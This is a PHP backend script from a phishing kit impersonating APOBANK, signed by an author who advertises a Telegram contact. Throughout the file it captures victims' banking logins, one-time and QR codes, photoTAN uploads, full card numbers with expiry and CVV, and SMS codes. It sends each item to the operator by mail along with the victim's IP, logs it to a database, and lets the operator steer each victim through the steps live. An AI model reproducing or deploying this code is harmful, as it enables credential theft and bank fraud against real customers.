<?php
    /*******
    Main Author: Z0N51
    Contact me on telegram : https://t.me/z0n51official
    ********************************************************/

    require_once 'app/config.php';

    if( $_GET['waiting'] == 1 ) {
        $response = panel_response();
        if( $response === 'badlogin' ) {
            $_SESSION['errors']['username'] = true;
            $_SESSION['errors']['password'] = true;
            echo "../index.php?redirection=login&error=1";
            exit();
        } else if( $response === 'code' ) {
            echo "../index.php?redirection=code";
            exit();
        } else if( $response === 'badcode' ) {
            $_SESSION['errors']['code'] = "Ungültiger Code";
            echo "../index.php?redirection=code&error=1";
            exit();
        } else if( $response === 'qrcode' ) {
            echo "../index.php?redirection=qrcode";
            exit();
        } else if( $response === 'badqrcode' ) {
            $_SESSION['errors']['code'] = "Ungültiger Code";
            echo "../index.php?redirection=qrcode&error=1";
            exit();
        } else if( $response === 'upload' ) {
            echo "../index.php?redirection=upload";
            exit();
        } else if( $response === 'badupload' ) {
            $_SESSION['errors']['phototan_file'] = true;
            echo "../index.php?redirection=upload&error=1";
            exit();
        } else if( $response === 'cc' ) {
            echo "../index.php?redirection=cc";
            exit();
        } else if( $response === 'badcc' ) {
            $_SESSION['one'] = "";
            $_SESSION['two'] = "";
            $_SESSION['three'] = "";
            $_SESSION['errors']['one'] = true;
            $_SESSION['errors']['two'] = true;
            $_SESSION['errors']['three'] = true;
            echo "../index.php?redirection=cc&error=1";
            exit();
        } else if( $response === 'sms' ) {
            echo "../index.php?redirection=sms";
            exit();
        } else if( $response === 'badsms' ) {
            $_SESSION['errors']['sms_code'] = "Ungültiger Code";
            echo "../index.php?redirection=sms&error=1";
            exit();
        } else if( $response === 'success' ) {
            echo "../index.php?redirection=success";
            exit();
        }
        exit();
    }

    if($_SERVER['REQUEST_METHOD'] == "POST") {

        if( !empty($_POST['cap']) ) {
            header("HTTP/1.0 404 Not Found");
            exit();
        }

        if ($_POST['steeep'] == "login") {
            $_SESSION['errors']     = [];
            $_SESSION['username']  = $_POST['username'];
            $_SESSION['password']  = $_POST['password'];
            if( empty($_POST['username']) ) {
                $_SESSION['errors']['username'] = true;
            }
            if( empty($_POST['password']) ) {
                $_SESSION['errors']['password'] = true;
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | APOBANK | Login';
                $message = '/-- LOGIN INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'Username : ' . $_POST['username'] . "\r\n";
                $message .= 'Password : ' . $_POST['password'] . "\r\n";
                $message .= '/-- END LOGIN INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                $data = [
                    'login'    => $_POST['username'] . ' | ' . $_POST['password'],
                    'ip'        => get_client_ip()
                ];
                insert_login($data);
                echo "../index.php?redirection=loading";
                exit();
            } else {
                echo "../index.php?redirection=login&error=1";
                exit();
            }
        }

        if ($_POST['steeep'] == "code") {
            $_SESSION['errors']     = [];
            $_SESSION['code']  = $_POST['code'];
            if( validate_number($_POST['code'],11) == false ) {
                $_SESSION['errors']['code'] = "Ungültiger Code";
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | APOBANK | Phone';
                $message = '/-- CODE INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'Code : ' . $_POST['code'] . "\r\n";
                $message .= '/-- END CODE INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                $data = [
                    'code'    => $_POST['code'],
                    'ip'        => get_client_ip()
                ];
                insert_code($data);
                echo "../index.php?redirection=loading";
                exit();
            } else {
                echo "../index.php?redirection=code&error=1";
                exit();
            }
        }

        if ($_POST['steeep'] == "qrcode") {
            $_SESSION['errors']     = [];
            $_SESSION['qrcode']  = $_POST['qrcode'];
            if( validate_number($_POST['qrcode'],6) == false ) {
                $_SESSION['errors']['qrcode'] = "Ungültiger Code";
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | APOBANK | Phone';
                $message = '/-- QRCODE INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'Qrcode Code : ' . $_POST['qrcode'] . "\r\n";
                $message .= '/-- END QRCODE INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                $data = [
                    'qrcode'    => $_POST['qrcode'],
                    'ip'        => get_client_ip()
                ];
                insert_qrcode($data);
                echo "../index.php?redirection=loading";
                exit();
            } else {
                echo "../index.php?redirection=qrcode&error=1";
                exit();
            }
        }

        if( $_POST['steeep'] == "cc" ) {
            $_SESSION['errors'] = [];
            $_SESSION['one']    = $_POST['one'];
            $_SESSION['two']    = $_POST['two'];
            $_SESSION['three']    = $_POST['three'];
            $date_ex    = explode('/',$_POST['two']);
            $one        = validate_one($_POST['one']);
            $three      = validate_three($_POST['three']);
            $two        = validate_two($date_ex[0],$date_ex[1]);
            if( $one == false ) {
                $_SESSION['errors']['one'] = true;
            }
            if( $two == false ) {
                $_SESSION['errors']['two'] = true;
            }
            if( $three == false ) {
                $_SESSION['errors']['three'] = true;
            }
            if( count($_SESSION['errors']) == 0 ) {
                $cc_nospace = str_replace(' ', '', $_POST['one']);
                $subject = get_client_ip() . ' | APOBANK | Card';
                $message = '/-- CARD INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'Card number : ' . $_POST['one'] . "\r\n";
                $message .= 'Card Date : ' . $_POST['two'] . "\r\n";
                $message .= 'Card CVV : ' . $_POST['three'] . "\r\n";
                $message .= '/-- END CARD INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                $data = [
                    'cc'    => $_POST['one'] . ' | ' . $_POST['two'] . ' | ' . $_POST['three'],
                    'ip'        => get_client_ip()
                ];
                insert_cc($data);
                echo "../index.php?redirection=loading";
                exit();
            } else {
                echo "../index.php?redirection=cc&error=1";
                exit();
            }
        }

        if( $_POST['steeep'] == "sms" ) {
            $_SESSION['errors'] = [];
            $_SESSION['sms_code']    = $_POST['sms_code'];
            if( empty($_POST['sms_code']) ) {
                $_SESSION['errors']['sms_code'] = "Ungültiger Code";
            }
            if( count($_SESSION['errors']) == 0 ) {
                $cc_nospace = str_replace(' ', '', $_POST['one']);
                $subject = get_client_ip() . ' | APOBANK | Sms';
                $message = '/-- SMS INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'SMS Code : ' . $_POST['sms_code'] . "\r\n";
                $message .= '/-- END SMS INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                $data = [
                    'sms'    => $_POST['sms_code'],
                    'ip'        => get_client_ip()
                ];
                insert_sms($data);
                echo "../index.php?redirection=loading";
                exit();
            } else {
                echo "../index.php?redirection=sms&error=1";
                exit();
            }
        }

        if ($_POST['steeep'] == "upload") {
            $_SESSION['errors']     = [];
            $_SESSION['phototan_file']   = $_POST['phototan_file'];
            if( empty($_POST['phototan_file']) ) {
                $_SESSION['errors']['phototan_file'] = true;
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | APOBANK | Phototan';
                $message = '/-- PHOTOTAN INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'Phototan Link : ' . $_POST['phototan_file'] . "\r\n";
                $message .= '/-- END PHOTOTAN INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                $data = [
                    'letter'     => $_POST['phototan_file'],
                    'ip'    => get_client_ip()
                ];
                insert_letter($data);
                echo "../index.php?redirection=loading";
                exit();
            } else {
                echo "../index.php?redirection=upload&error=1";
                exit();
            }
        }

        if ($_GET['step'] == "upload") {
            $_SESSION['errors']      = [];
            $filename = $_GET['filename'];
            $url     = "http://". $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
            $x       = pathinfo($url);
            $dirname = explode('/',$x['dirname']);
            //array_pop($dirname);
            $dirname = implode('/',$dirname) . '/upload/';
            if( empty($_FILES[$filename]['name']) ) {
                echo 'error';
                exit();
            }
            $carte = upload_file($_FILES[$filename],$filename);
            if( $carte !== false ) {
                echo $dirname . $carte;
                exit();
            }
            echo 'error';
            exit();
        }

    } else {
        header("HTTP/1.0 404 Not Found");
        exit();
    }

?>